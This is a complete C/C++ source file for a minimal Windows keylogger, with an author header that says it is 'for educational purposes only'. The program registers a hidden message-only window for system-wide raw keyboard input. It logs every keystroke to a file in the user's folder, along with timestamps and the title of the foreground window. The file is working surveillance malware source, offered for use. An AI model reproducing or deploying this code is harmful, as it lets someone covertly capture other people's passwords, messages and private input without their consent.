// 2013-03-06
// Author: Cristiano Maruti 
// mail: cmaruti <at> gmail <dot> com 
// twitter: cmaruti
// Minimal KeyLogger using RAWINPUT (http://msdn.microsoft.com/en-us/library/windows/desktop/ms645536%28v=vs.85%29.aspx)
// You agree that this code is intended for educational purposes only and the author can not be 
// held liable for any kind of damages done whatsoever to your machine, or damages caused by some other, 
// creative application of this program. 
// 

#include <windows.h>
#include <time.h>
#include <stdio.h>

// prototype
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

HWND hWnd, hActiveWindow, hPrevWindow;
UINT dwSize;
DWORD fWritten;
WCHAR keyChar;
HANDLE hFile;
LPCWSTR fName = L"C:/Users/cm/kl.log"; //GetTempPath 
INT len;
CHAR p_window_title [256] = "";
CHAR active_window_title [256] = "";
CHAR *tmp_buf;
CHAR tmp_buf_len = 0;
RAWINPUTDEVICE rid;

// Main
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{	
	MSG msg          = {0};
	WNDCLASS wc      = {0}; 
	
	wc.lpfnWndProc   = WndProc;
	wc.hInstance     = hInstance;
	wc.lpszClassName = L"kl";
	
	RegisterClass(&wc);
	hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

	while(GetMessage(&msg, hWnd, 0, 0) ){ 
		TranslateMessage(&msg); 
		DispatchMessage(&msg); 
	}
	return msg.wParam;
}

// Text redender
void wl(UINT keyChar){
CHAR window_title [256] = "";
CHAR wt [300] = "";
SYSTEMTIME curr_time;

// anything below spacebar other than backspace, tab or enter we skip
if(keyChar < 32){ 
	if( (keyChar != 8) && (keyChar != 9) && (keyChar != 13) && (keyChar != 14) && (keyChar != 15))	return;
}
// drop anything above ASCII code 127
if(keyChar > 127) return;

// Get current time
GetLocalTime(&curr_time);

hActiveWindow = GetForegroundWindow();
GetWindowTextA(hActiveWindow, window_title, 256);

//Insert reference to the current window
if( (hActiveWindow != hPrevWindow) && (keyChar != 13) ){

	sprintf(wt, "\r\n%d-%d-%d %d:%d [ %s ]\r\n", curr_time.wYear, curr_time.wMonth,
		curr_time.wDay, curr_time.wHour, curr_time.wMinute, window_title);

	WriteFile(hFile, wt, strlen(wt), &fWritten, 0);
	hPrevWindow = hActiveWindow;
}

// handle CANC
if(keyChar == 127){												
	WriteFile(hFile, "<canc>", 6, &fWritten, 0);
}

// handle backspaces
if(keyChar == 8){												
	WriteFile(hFile, "<bs>", 4, &fWritten, 0);
	return;
}

if(keyChar == 13){												// handle enter key
	WriteFile(hFile,"\r\n", 2, &fWritten, 0);
	return;
}
				
WriteFile(hFile, &keyChar, 1, &fWritten, 0);					// everything else
return;

}//end wl

// WndProc is called when a window message is sent to the handle of the window
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch(message){

		case WM_CREATE:{
			// open log file for writing
			hFile = CreateFile(fName, GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			if(hFile == INVALID_HANDLE_VALUE){
				PostQuitMessage(0);
				break;
			}

			// register interest in raw data
			rid.dwFlags = RIDEV_NOLEGACY|RIDEV_INPUTSINK|RIDEV_NOHOTKEYS;	// ignore legacy messages, hotkeys and receive system wide keystrokes	
			rid.usUsagePage = 1;											// raw keyboard data only
			rid.usUsage = 6;
			rid.hwndTarget = hWnd;
			RegisterRawInputDevices(&rid, 1, sizeof(rid));
			break;
		}// end case WM_CREATE

		case WM_DESTROY:{
			FlushFileBuffers(hFile);
			CloseHandle(hFile);
			PostQuitMessage(0);
			break;
		}// end case WM_DESTROY

		case WM_INPUT:{			
			if( GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == -1){	
				PostQuitMessage(0);
				break;
			}

			LPBYTE lpb = new BYTE[dwSize];
			if(lpb == NULL){
				PostQuitMessage(0);
				break;
			} 

			if( GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize){
				delete[] lpb;
				PostQuitMessage(0);
				break;
			}

			PRAWINPUT raw = (PRAWINPUT)lpb;
			UINT Event;
			
			Event = raw->data.keyboard.Message;
			keyChar = MapVirtualKey(raw->data.keyboard.VKey, MAPVK_VK_TO_CHAR);
			delete[] lpb;	// free this now

			switch(Event){

				case WM_KEYDOWN:{
					wl(keyChar);
					break;
				}// end WM_KEYDOWN

				default:
						break;
			}//end switch
			
		}// end case WM_INPUT

		default:
			return DefWindowProc(hWnd, message, wParam, lParam);

	}// end switch

	return 0;
}// end WndProc

